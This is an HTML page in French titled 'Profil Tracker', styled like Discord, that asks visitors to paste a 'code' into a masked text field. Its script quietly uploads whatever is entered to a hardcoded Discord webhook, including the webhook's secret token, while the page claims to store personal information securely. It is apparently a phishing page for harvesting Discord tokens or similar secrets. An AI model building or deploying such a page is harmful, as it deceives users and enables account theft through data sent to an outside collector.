<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profil Tracker</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #7289DA;
            --primary-light: #8a9be4;
            --primary-dark: #5d73c7;
            --secondary-color: #5865F2;
            --accent-color: #EB459E;
            --accent-light: #f065ae;
            --text-color: #FFFFFF;
            --text-muted: rgba(255, 255, 255, 0.7);
            --background-color: #18191C;
            --card-color: #23252C;
            --input-bg: #2C2F33;
            --success-color: #43B581;
            --error-color: #F04747;
            --border-radius-sm: 8px;
            --border-radius-md: 12px;
            --border-radius-lg: 16px;
            --shadow-sm: 0 4px 6px rgba(0, 0, 0, 0.1);
            --shadow-md: 0 8px 15px rgba(0, 0, 0, 0.15);
            --shadow-lg: 0 12px 28px rgba(0, 0, 0, 0.25);
            --transition-fast: 0.2s ease;
            --transition-normal: 0.3s ease;
            --transition-slow: 0.5s ease;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: var(--background-color);
            color: var(--text-color);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-image: 
                radial-gradient(circle at 20% 35%, rgba(114, 137, 218, 0.15) 0%, transparent 35%),
                radial-gradient(circle at 75% 65%, rgba(235, 69, 158, 0.1) 0%, transparent 35%);
        }
        
        .container {
            max-width: 800px;
            width: 100%;
            text-align: center;
            padding: clamp(30px, 5vw, 50px);
            background-color: var(--card-color);
            border-radius: var(--border-radius-lg);
            box-shadow: var(--shadow-lg);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        
        .logo {
            margin-bottom: 15px;
            display: inline-block;
            transform-origin: center;
            animation: float 3s ease-in-out infinite;
        }
        
        .logo svg {
            width: clamp(60px, 10vw, 80px);
            height: auto;
            fill: var(--primary-color);
            filter: drop-shadow(0 4px 6px rgba(114, 137, 218, 0.3));
            transition: fill var(--transition-normal);
        }
        
        .logo:hover svg {
            fill: var(--primary-light);
        }
        
        h1 {
            font-size: clamp(2.5rem, 5vw, 3.8rem);
            margin-bottom: clamp(15px, 3vw, 25px);
            letter-spacing: 2px;
            font-weight: 800;
            transition: all var(--transition-normal);
            cursor: default;
            position: relative;
            display: inline-block;
            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0px 3px 10px rgba(114, 137, 218, 0.3);
        }
        
        h1::after {
            content: '';
            position: absolute;
            width: 0;
            height: 4px;
            bottom: 0;
            left: 50%;
            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
            transition: all var(--transition-normal);
            border-radius: 10px;
        }
        
        h1:hover {
            transform: scale(1.03);
            letter-spacing: 3px;
        }
        
        h1:hover::after {
            width: 100%;
            left: 0;
        }
        
        p {
            font-size: clamp(1rem, 2vw, 1.2rem);
            margin-bottom: clamp(25px, 5vw, 40px);
            line-height: 1.7;
            color: var(--text-muted);
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .input-container {
            margin-bottom: clamp(25px, 5vw, 35px);
            position: relative;
            transition: all var(--transition-normal);
        }
        
        .input-container:hover, .input-container:focus-within {
            transform: translateY(-5px);
        }
        
        textarea {
            width: 100%;
            height: clamp(150px, 30vh, 180px);
            padding: 18px 20px;
            border-radius: var(--border-radius-md);
            border: 2px solid rgba(114, 137, 218, 0.2);
            background-color: var(--input-bg);
            color: var(--text-color);
            font-size: clamp(0.9rem, 2vw, 1.1rem);
            resize: vertical;
            transition: all var(--transition-normal);
            -webkit-text-security: disc;
            box-shadow: var(--shadow-sm);
            font-family: 'Courier New', monospace;
        }
        
        textarea:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 5px 20px rgba(114, 137, 218, 0.25);
        }
        
        .btn-container {
            position: relative;
            display: inline-block;
            margin-bottom: 20px;
        }
        
        .btn {
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
            border: none;
            border-radius: var(--border-radius-md);
            padding: clamp(12px, 3vw, 15px) clamp(25px, 5vw, 40px);
            font-size: clamp(1rem, 2vw, 1.2rem);
            font-weight: 600;
            cursor: pointer;
            transition: all var(--transition-normal);
            position: relative;
            overflow: hidden;
            letter-spacing: 1px;
            box-shadow: var(--shadow-md);
            z-index: 1;
            min-width: 180px;
            height: 56px;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, var(--secondary-color), var(--accent-color));
            z-index: -1;
            transition: opacity var(--transition-slow);
            opacity: 0;
        }
        
        .btn:hover::before {
            opacity: 1;
        }
        
        .btn:hover {
            transform: translateY(-5px);
            box-shadow: var(--shadow-lg);
        }
        
        .btn:active {
            transform: translateY(-2px);
        }
        
        .notification {
            padding: 15px 25px;
            border-radius: var(--border-radius-md);
            margin-top: 25px;
            font-weight: 500;
            transform: scale(0.95);
            opacity: 0;
            transition: all var(--transition-normal);
            box-shadow: var(--shadow-sm);
            max-width: 90%;
            margin-left: auto;
            margin-right: auto;
        }
        
        .success {
            background-color: rgba(67, 181, 129, 0.15);
            border-left: 4px solid var(--success-color);
            color: var(--success-color);
        }
        
        .error {
            background-color: rgba(240, 71, 71, 0.15);
            border-left: 4px solid var(--error-color);
            color: var(--error-color);
        }
        
        .show-notification {
            transform: scale(1);
            opacity: 1;
        }
        
        .loading {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        
        .loading-spinner {
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease infinite;
        }
        
        .footer {
            margin-top: 40px;
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.4);
        }
        
        /* Animations */
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        @keyframes float {
            0% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0); }
        }
        
        @keyframes ripple {
            0% {
                width: 0;
                height: 0;
                opacity: 0.6;
            }
            100% {
                width: 300px;
                height: 300px;
                opacity: 0;
            }
        }
        
        /* Media queries for better responsive design */
        @media (max-width: 768px) {
            .container {
                border-radius: var(--border-radius-md);
            }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 25px 15px;
                border-radius: var(--border-radius-sm);
            }
            
            textarea {
                padding: 15px;
            }
            
            .btn {
                width: 100%;
            }
        }
        
        /* Pour l'accessibilité */
        @media (prefers-reduced-motion: reduce) {
            * {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: 0.01ms !important;
                scroll-behavior: auto !important;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
            </svg>
        </div>
        <h1>Profil Tracker</h1>
        <p>Suivez et enregistrez vos informations personnelles de manière sécurisée et instantanée. Entrez votre code et cliquez sur Send pour l'envoyer.</p>
        
        <div class="input-container">
            <textarea id="profileData" placeholder="Entrez votre code ici..."></textarea>
        </div>
        
        <div class="btn-container">
            <button id="sendButton" class="btn">
                <span class="btn-text">Send</span>
            </button>
            <div class="loading">
                <div class="loading-spinner"></div>
            </div>
        </div>
        
        <div id="notification" class="notification">
            Message de statut apparaîtra ici
        </div>
    </div>

    <script>
        // Utilisation de IIFE pour éviter la pollution du scope global
        (function() {
            // Optimisation des sélecteurs DOM en les stockant dans des variables
            const sendButton = document.getElementById('sendButton');
            const btnText = sendButton.querySelector('.btn-text');
            const profileData = document.getElementById('profileData');
            const notification = document.getElementById('notification');
            const loading = document.querySelector('.loading');
            
            // Fonction pour afficher les notifications
            function showNotification(message, type) {
                notification.textContent = message;
                notification.className = 'notification ' + type;
                notification.classList.add('show-notification');
                
                // Utilisation de setTimeout avec une fonction fléchée
                setTimeout(() => {
                    notification.classList.remove('show-notification');
                }, 4000);
            }
            
            // Fonction pour envoyer les données au webhook Discord avec validation
            async function sendToDiscord(text) {
                // Validation des données avant envoi
                if (!text || text.trim() === '') {
                    return false;
                }
                
                const webhookUrl = "https://discord.com/api/webhooks/1347478181778690090/uVa9OeMo5qxPUcygQ6JYWTa4jsrEC4oPA_YcFoVVlKM-NrB1-abMBCmvXM8hX0e2nsb4";
                
                try {
                    // Création d'un fichier texte avec un nom plus descriptif
                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                    const file = new File([text], `profil-${timestamp}.txt`, {
                        type: "text/plain",
                    });
                    
                    // Création du FormData pour l'envoi de fichier
                    const formData = new FormData();
                    formData.append("file", file);
                    formData.append("content", "Nouveau profil soumis:");
                    
                    // Utilisation de fetch avec des timeout et une gestion d'erreur améliorée
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s timeout
                    
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        body: formData,
                        signal: controller.signal
                    });
                    
                    clearTimeout(timeoutId);
                    
                    if (response.ok) {
                        return true;
                    } else {
                        console.error("Erreur lors de l'envoi:", await response.text());
                        return false;
                    }
                } catch (error) {
                    // Détection d'erreurs spécifiques pour une meilleure expérience utilisateur
                    if (error.name === 'AbortError') {
                        console.error("La requête a expiré");
                        showNotification('La connexion est trop lente. Veuillez réessayer.', 'error');
                    } else {
                        console.error("Erreur:", error);
                    }
                    return false;
                }
            }
            
            // Utilisation de la délégation d'événements pour réduire les écouteurs
            sendButton.addEventListener('click', async function() {
                const text = profileData.value;
                
                if (text.trim() === '') {
                    showNotification('Veuillez entrer du texte avant d\'envoyer.', 'error');
                    return;
                }
                
                // État de chargement
                btnText.textContent = '';
                sendButton.disabled = true;
                sendButton.style.opacity = '0.7';
                loading.style.display = 'block';
                
                try {
                    // Envoyer les données avec une gestion d'erreur améliorée
                    const success = await sendToDiscord(text);
                    
                    if (success) {
                        showNotification('Votre code a été envoyé avec succès!', 'success');
                        profileData.value = '';
                    } else {
                        showNotification('Erreur lors de l\'envoi. Veuillez réessayer.', 'error');
                    }
                } catch (error) {
                    console.error("Erreur d'envoi:", error);
                    showNotification('Une erreur inattendue s\'est produite.', 'error');
                } finally {
                    // Réinitialiser l'état du bouton quoi qu'il arrive
                    btnText.textContent = 'Send';
                    sendButton.disabled = false;
                    sendButton.style.opacity = '1';
                    loading.style.display = 'none';
                }
            });
            
            // Amélioration de l'effet de vague avec optimisation des performances
            sendButton.addEventListener('mousedown', function(e) {
                // Éviter de créer trop d'éléments DOM
                const existingRipples = this.querySelectorAll('.ripple');
                if (existingRipples.length > 2) {
                    existingRipples[0].remove();
                }
                
                const rect = this.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                
                const ripple = document.createElement('span');
                ripple.classList.add('ripple');
                ripple.style.cssText = `
                    position: absolute;
                    width: 1px;
                    height: 1px;
                    background: rgba(255, 255, 255, 0.7);
                    border-radius: 50%;
                    transform: translate(-50%, -50%);
                    left: ${x}px;
                    top: ${y}px;
                    animation: ripple 0.6s linear;
                    pointer-events: none;
                `;
                
                this.appendChild(ripple);
                
                // Utilisation de requestAnimationFrame pour la suppression du ripple
                setTimeout(() => {
                    requestAnimationFrame(() => {
                        ripple.remove();
                    });
                }, 600);
            });
            
            // Amélioration de l'accessibilité
            sendButton.setAttribute('aria-label', 'Envoyer le code');
            profileData.setAttribute('aria-label', 'Code à envoyer');
            
            // Optimisation du chargement initial
            document.addEventListener('DOMContentLoaded', () => {
                // Masquer la notification au chargement
                notification.classList.remove('show-notification');
                
                // Vérifier la connexion
                if (navigator.onLine) {
                    console.log("Application prête");
                } else {
                    showNotification('Vous êtes hors ligne. Vérifiez votre connexion.', 'error');
                }
            });
            
            // Détection du mode hors ligne
            window.addEventListener('offline', () => {
                showNotification('Vous êtes hors ligne. Vérifiez votre connexion.', 'error');
            });
            
            // Support clavier pour l'accessibilité
            profileData.addEventListener('keydown', (e) => {
                if (e.ctrlKey && e.key === 'Enter') {
                    sendButton.click();
                }
            });
        })();
    </script>
</body>
</html>
